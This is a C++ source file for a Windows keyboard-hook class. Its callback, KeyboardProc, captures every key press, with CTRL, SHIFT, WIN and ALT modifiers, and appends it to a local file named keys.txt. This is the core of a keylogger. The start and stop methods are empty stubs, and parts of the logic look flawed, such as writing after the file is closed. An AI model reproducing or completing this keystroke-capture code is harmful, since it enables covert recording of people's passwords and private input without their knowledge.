#include "KeyboardHooking.h"

void KeyboardHooking::StartKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::StopKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::MsgLoop()
{
	MSG message;
	while (GetMessage(&message,NULL,0,0))
    {
		TranslateMessage(&message);
		DispatchMessage(&message);
    }
}

LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	std::ofstream key_file;
	key_file.open("keys.txt", std::ios::app);
	if (!key_file.is_open())
	{
		//std::cout << "Could not open the key_file!\n";
	}

	SpecialKeys Key;
	std::string key_name = "";

	if (wParam == WM_SYSKEYDOWN) // for alt key
	{
		if (Key.KeyIsDownNow(VK_MENU)
			|| Key.KeyIsDownNow(VK_LMENU)
			|| Key.KeyIsDownNow(VK_RMENU))
		{
			key_file << " [ALT + KEY] ";
			key_file.close();
		}
	}

	if (wParam == WM_KEYDOWN) // if the key is down
	{
		//get the key from lParam
		PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code

		if (key.count((key_param->vkCode)) == 0)
		{
			key_file << " [UNDEFINED: vk_code is " << std::hex << std::to_string(key_param->vkCode) 
				<< std::dec << " ] ";
			key_file.close();
		}
		else
		{
			if ((Key.KeyIsDownNow(VK_CONTROL)
				|| Key.KeyIsDownNow(VK_LCONTROL)
				|| Key.KeyIsDownNow(VK_RCONTROL))
				&& !Key.KeyWasDownBefore(VK_CONTROL)
				&& !Key.KeyWasDownBefore(VK_LCONTROL)
				&& !Key.KeyWasDownBefore(VK_RCONTROL))
			{
				key_name += " CTRL + ";
			}
		
			if ((Key.KeyIsDownNow(VK_SHIFT)
				|| Key.KeyIsDownNow(VK_LSHIFT)
				|| Key.KeyIsDownNow(VK_RSHIFT))
				&& !Key.KeyWasDownBefore(VK_SHIFT)
				&& !Key.KeyWasDownBefore(VK_LSHIFT)
				&& !Key.KeyWasDownBefore(VK_RSHIFT))
			{
				key_name += " SHIFT + ";
			}
		
			if ((Key.KeyIsDownNow(VK_LWIN)
				|| Key.KeyIsDownNow(VK_RWIN))
				&& !Key.KeyWasDownBefore(VK_LWIN)
				&& !Key.KeyWasDownBefore(VK_RWIN))
			{
				key_name += " WIN + ";
			}
									
			UINT scan = (key_param->vkCode) >> SCAN_CODE_SHIFT;
			KeyPair scan_code = key[scan];
			std::string key_name_buf = scan_code.GetKeyName();
			key_name += key_name_buf;
			key_file << key_name;
		}
	}
	key_file.close();
	return CallNextHookEx(NULL, code, wParam, lParam);
}




